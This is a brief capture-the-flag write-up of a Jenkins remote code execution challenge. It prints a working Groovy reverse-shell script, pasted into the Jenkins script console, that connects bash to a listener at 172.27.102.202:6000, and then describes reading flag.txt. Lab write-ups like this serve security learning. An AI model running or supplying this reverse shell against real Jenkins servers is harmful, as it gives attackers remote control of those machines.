Sadly couldn't get more info on the chall, I wrote this solution so quick while playing the CTF

It was a jenkins RCE challenge, you had admin to Jenkins and from there you find oyour path for any exploit, I searched about jenkins exploits and found this, wrote it in Jenkins console somewhere in Jenkins pages and got my shell (I think it's this page http://jenkins.hackerspacejust.com:8080/script)

```py 

        String host="172.27.102.202";
        int port=6000;
        String cmd="bash";
        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Then I got shell, I simply ran `ls` and found `flag.txt` cat it and there you go
   
   
